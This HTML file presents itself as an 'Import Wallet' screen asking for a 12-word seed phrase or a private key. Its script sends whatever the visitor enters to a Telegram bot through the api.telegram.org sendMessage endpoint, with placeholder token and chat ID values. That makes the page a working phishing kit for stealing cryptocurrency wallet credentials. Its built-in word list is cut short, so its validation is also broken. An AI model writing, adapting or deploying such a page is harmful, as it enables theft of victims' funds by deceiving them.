<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=350, height=600, initial-scale=1.0" />
  <title>Import Wallet</title>
  <style>
    html, body {
      width: 350px;
      height: 600px;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      overflow: hidden;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 10px;
      box-sizing: border-box;
    }

    h2 {
      text-align: center;
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 10px;
    }

    .tab-buttons {
      display: flex;
      width: 100%;
      margin-bottom: 10px;
      border-radius: 6px;
      overflow: hidden;
      box-shadow: inset 0 0 1px rgba(0,0,0,0.1);
    }

    .tab-buttons button {
      flex: 1;
      padding: 10px 0;
      border: none;
      font-size: 13px;
      cursor: pointer;
      transition: background 0.3s, color 0.3s;
    }

    .tab-buttons button.active {
      background-color: #d4d4d4;
      color: black;
    }

    .tab-buttons button.inactive {
      background-color: white;
      color: #666;
    }

    label {
      font-size: 13px;
      margin-bottom: 4px;
      display: block;
    }

    select {
      width: 100%;
      padding: 6px;
      font-size: 13px;
      margin-bottom: 10px;
    }

    .grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 6px;
      width: 100%;
    }

    .grid input {
      padding: 8px;
      font-size: 13px;
      border-radius: 4px;
      border: 1px solid #aaa;
    }

    textarea {
      width: 100%;
      padding: 8px;
      font-size: 13px;
      border-radius: 4px;
      border: 1px solid #aaa;
      resize: none;
    }

    .confirm-btn {
      margin-top: 10px;
      width: 80%;
      padding: 10px;
      font-size: 14px;
      background-color: black;
      color: white;
      border: none;
      border-radius: 20px;
      cursor: pointer;
    }

    .message {
      margin-top: 10px;
      font-size: 13px;
      font-weight: bold;
      text-align: center;
    }

    .error { color: red; }
    .success { color: green; }
  </style>
</head>
<body>
  <h2>Importing Wallet</h2>
  <div class="tab-buttons">
    <button id="secretTab" class="active" onclick="showTab('secret')">Secret phrase</button>
    <button id="privateTab" class="inactive" onclick="showTab('private')">Private key</button>
  </div>

  <label for="wordsCount">Seed phrase words:</label>
  <select id="wordsCount" onchange="updateInputs(this.value)">
    <option value="12" selected>12</option>
  </select>

  <div id="secretTabContent">
    <div class="grid" id="seedInputs"></div>
  </div>

  <div id="privateTabContent" style="display:none">
    <textarea id="privateKeyInput" rows="4" placeholder="Enter your private key"></textarea>
  </div>

  <button class="confirm-btn" onclick="onConfirm()">Confirm</button>
  <div id="message" class="message"></div>

  <script>
    const TELEGRAM_BOT_TOKEN = 'TON_TOKEN';
    const TELEGRAM_CHAT_ID = 'TON_CHAT_ID';

    const bip39Words = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual"];

    function updateInputs(count) {
      const container = document.getElementById('seedInputs');
      container.innerHTML = '';
      for (let i = 1; i <= count; i++) {
        const input = document.createElement('input');
        input.placeholder = i;
        container.appendChild(input);
      }
    }

    function showTab(tab) {
      const secretTab = document.getElementById('secretTab');
      const privateTab = document.getElementById('privateTab');
      const secretContent = document.getElementById('secretTabContent');
      const privateContent = document.getElementById('privateTabContent');

      if (tab === 'secret') {
        secretTab.classList.add('active');
        privateTab.classList.remove('active');
        secretTab.classList.remove('inactive');
        privateTab.classList.add('inactive');
        secretContent.style.display = 'block';
        privateContent.style.display = 'none';
      } else {
        privateTab.classList.add('active');
        secretTab.classList.remove('active');
        privateTab.classList.remove('inactive');
        secretTab.classList.add('inactive');
        privateContent.style.display = 'block';
        secretContent.style.display = 'none';
      }
      showMessage("");
    }

    function showMessage(text, isError = false) {
      const msg = document.getElementById("message");
      msg.textContent = text;
      msg.className = isError ? "message error" : "message success";
    }

    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
      });
    }

    function onConfirm() {
      const secretTabActive = document.getElementById('secretTab').classList.contains('active');
      if (secretTabActive) {
        const inputs = document.querySelectorAll('#seedInputs input');
        const words = Array.from(inputs).map(i => i.value.trim().toLowerCase());
        if (words.includes('')) {
          showMessage("‚ùå Please fill all fields", true);
          return;
        }
        const invalid = words.filter(w => !bip39Words.includes(w));
        if (invalid.length > 0) {
          showMessage("‚ùå Incorrect phrase", true);
          return;
        }
        sendToTelegram(`ü™ô Seed Phrase:\n\n${words.join(" ")}`);
        showMessage("‚úÖ Sent to Telegram");
      } else {
        const key = document.getElementById('privateKeyInput').value.trim();
        if (!key) {
          showMessage("‚ùå Enter private key", true);
          return;
        }
        sendToTelegram(`üîë Private Key:\n\n${key}`);
        showMessage("‚úÖ Sent to Telegram");
      }
    }

    updateInputs(12);
  </script>
</body>
</html>
